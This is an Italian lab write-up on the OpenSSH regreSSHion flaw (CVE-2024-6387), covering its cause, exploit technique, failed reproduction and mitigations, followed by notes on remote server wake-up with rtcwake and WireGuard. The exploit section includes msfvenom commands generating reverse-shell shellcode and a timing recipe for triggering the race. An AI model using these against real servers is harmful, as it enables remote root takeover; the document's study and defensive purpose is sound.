⚠ CVSS 8.1 (High) • Scoperto da Qualys, luglio 2024 • ~14 milioni server vulnerabili esposti su internet al momento del disclosure • Attivita' in lab: 2026-03-27/28

🕐 Background: storia della regressione

AnnoEvento
2006CVE-2006-5051 scoperto e fixato in OpenSSH 4.4p1
2020Un aggiornamento OpenSSH rimuove accidentalmente il fix
2024 luglioQualys lo riscopre e pubblica come CVE-2024-6387 regreSSHion

🔀 Causa tecnica

syslog() viene chiamata dall'interno del signal handler SIGALRM. Le funzioni in un signal handler devono essere async-signal-safe: syslog() non lo e' perche' internamente chiama malloc()/free(), che non sono rientranti.

# Versione vulnerabile (8.5p1 - 9.7p1)
LoginGraceTime scade -> SIGALRM -> handler -> syslog() -> malloc()
                                                              ^
                                                   Non rientrante: PERICOLOSO

# Versione patchata (>= 9.8p1)
LoginGraceTime scade -> SIGALRM -> handler -> (solo operazioni async-signal-safe)

🔀 Come funziona l'exploit

L'idea e' controintuitiva: invece di autenticarsi il prima possibile, si resta connessi in silenzio per quasi 120 secondi, poi si triggera il crash nel momento esatto in cui sshd riceve SIGALRM.

TempoAttaccantesshd (vittima)
t=0sApre la connessione TCP. Non manda credenziali.Avvia countdown LoginGraceTime 120s
t=0-119sInvia pacchetti crafted per riempire la heap (heap grooming)Aspetta autenticazione, processa i pacchetti
t=119.978sManda il pacchetto finale — trattiene l'ultimo byteSta ancora aspettando
t=119.979sManda l'ultimo byte: malloc() dentro sshd partemalloc() inizia ad allocare
t=120.000sHa gia' fatto tuttoSIGALRM scatta, interrompe malloc() a meta'. syslog() chiama malloc() su heap corrotta: trova lo shellcode, lo esegue come root

🔧 I tre ingredienti

1. Heap grooming
Si mandano pacchetti di dimensioni precise per creare coppie di chunk alternati (large ~4-8KB + small ~300B) nella heap di sshd. I chunk piccoli diventano posizioni candidate per la fake FILE struct.
2. Fake FILE struct
glibc usa strutture FILE con vtable di puntatori a funzione. Si costruisce una struttura falsa con offset precisi verso glibc per fare in modo che malloc() corrotta chiami il codice dello shellcode.
3. Timing preciso (~1ms)
Il pacchetto finale viene mandato in due parti: tutto tranne l'ultimo byte, poi l'ultimo byte ~1ms prima di SIGALRM. Il server sta processando il pacchetto proprio quando il segnale scatta.

# x86 (32-bit) - reverse shell TCP
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f c -b "\x00"

# x86_64 (64-bit)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f c -b "\x00"

🔍 Perche' non e' stato riprodotto

Problema 1: offset _IO_codecvt

_IO_codecvt viene allocato sull'heap da fwide() a runtime: non ha offset fisso dentro glibc. Il valore degli exploit pubblici e' un placeholder errato, verificato su glibc 2.35 (Ubuntu 22.04) e glibc 2.36 (Debian 12). Qualys non punta a una struttura statica: costruisce la heap tramite grooming in modo che _codecvt punti a memoria controllata dall'attaccante. Il codice Qualys funzionante non e' mai stato pubblicato (a marzo 2026, quasi 2 anni dopo il disclosure di luglio 2024).

Problema 2: ASLR su sistemi moderni

🛡 Mitigazioni

✅ Fix definitivo: aggiornare OpenSSH a ≥ 9.8p1 o alla versione patchata della propria distro. La patch rimuove syslog() dal signal handler e usa solo operazioni async-signal-safe. 
# Mitigazione immediata (senza aggiornare OpenSSH)
# Elimina la finestra di race: senza LoginGraceTime SIGALRM non scatta mai
echo "LoginGraceTime 0" >> /etc/ssh/sshd_config
systemctl restart ssh

# Limita connessioni non autenticate simultanee
echo "MaxStartups 10:30:10" >> /etc/ssh/sshd_config
  • ✓ Aggiornare OpenSSH a ≥ 9.8p1 (fix definitivo)
  • ✓ LoginGraceTime 0 elimina la finestra di race
  • ✓ fail2ban con backend systemd: blocca dopo 5-10 tentativi
  • ✓ Rate limiting firewall + MaxStartups 10:30:10
  • ○ IDS/SIEM alert su pattern di connessioni anomale

Remote Power Management

Server a Milano gestito da remoto (es. Praga) tramite timer RTC hardware.

⚡ Il server non e' sempre acceso. La gestione remota avviene tramite rtcwake, che usa il Real Time Clock hardware della scheda madre per programmare il wake — senza bisogno di Wake-on-LAN o intervento fisico.

🔀 Come funziona rtcwake

rtcwake imposta un timer sull'RTC (chip orologio hardware integrato in ogni scheda madre) che rimane attivo anche quando il PC e' spento. Alla scadenza, il chip invia un segnale di wake che accende il sistema automaticamente.

# Spegni e riaccenditi tra N secondi (off = spegnimento completo ACPI S5)
rtcwake -m off -s <secondi>

# Esempi pratici
rtcwake -m off -s 3600    # riaccendi tra 1 ora
rtcwake -m off -s 28800   # riaccendi tra 8 ore

# Riaccendi a un'ora precisa (domani alle 09:00)
rtcwake -m off -t $(date +%s -d "tomorrow 09:00")

# Verifica l'orario RTC impostato
cat /sys/class/rtc/rtc0/wakealarm

🕐 Flusso operativo

Da remoto (Praga / qualsiasi posto)
Accesso al server via WireGuard VPN + DDNS. Pianificazione della sessione di lavoro.
Fine sessione
Eseguo rtcwake -m off -s <secondi> per programmare la prossima accensione, poi il server si spegne.
Orario programmato
Il chip RTC hardware accende il server. Proxmox si avvia, i servizi partono automaticamente.

✅ Vantaggi

Nessun hardware aggiuntivo
Non serve smart plug, Wake-on-LAN configurato, o qualcuno fisicamente presente. L'RTC e' integrato in ogni scheda madre.
Risparmio energetico
Il server e' acceso solo quando serve. Riduce consumo energetico e usura dell'hardware rispetto a lasciarlo sempre on.
Gestione da qualsiasi posto
Da Praga, in treno, da qualsiasi dispositivo con WireGuard configurato. Basta un client VPN attivo.

🚨 Incidente rtcwake — 2026-03-28

⚠ Il server non si e' riacceso all'orario programmato. Causa investigata: problema di connettivita' VPN durante il riavvio che ha impedito l'accesso alla sessione pianificata.

Lezione appresa: verificare sempre che WireGuard sia abilitato all'avvio automatico prima di programmare sessioni rtcwake critiche.

# Assicurarsi che WireGuard parta al boot
systemctl enable wg-quick@wg0

# Con PiVPN
systemctl enable wg-quick@pivpn0

# Verifica stato
systemctl is-enabled wg-quick@wg0
